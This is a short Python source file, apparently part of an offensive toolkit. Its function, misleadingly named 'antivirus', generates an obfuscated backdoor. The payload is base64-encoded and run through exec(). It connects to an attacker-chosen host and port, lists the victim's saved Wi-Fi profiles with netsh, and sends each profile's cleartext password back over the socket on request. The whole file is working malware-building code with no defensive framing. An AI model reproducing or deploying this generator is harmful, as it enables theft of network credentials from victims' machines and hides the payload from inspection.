import base64
def antivirus(lport, lhost, filename):
    with open(filename, "x") as backdoor_pass:
        payload = (r"""
import subprocess
import socket
command = "netsh wlan show profiles"
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("{}", int({})))
op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
output = op.stdout.read()
output_error = op.stderr.read()
client.send(output + output_error)
while True:
    data = client.recv(1048576)
    data = data.decode()
    if data == "show profiles" or data == "Show profiles":
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        client.send(output + output_error)
    else:
        password = "netsh wlan show profile " + data + " key=clear"
        op = subprocess.Popen(password, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        client.send(output + output_error)
                """).format(lhost, lport)
        payload_bytes = payload.encode('utf-8')
        base64_bytes = base64.b64encode(payload_bytes)
        base64_payload = base64_bytes.decode('utf-8')
        backdoor_pass.write(r"""
payload = '{}'
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')(payload)[0]))
            """.format(base64_payload))
        return "socket,subprocess"
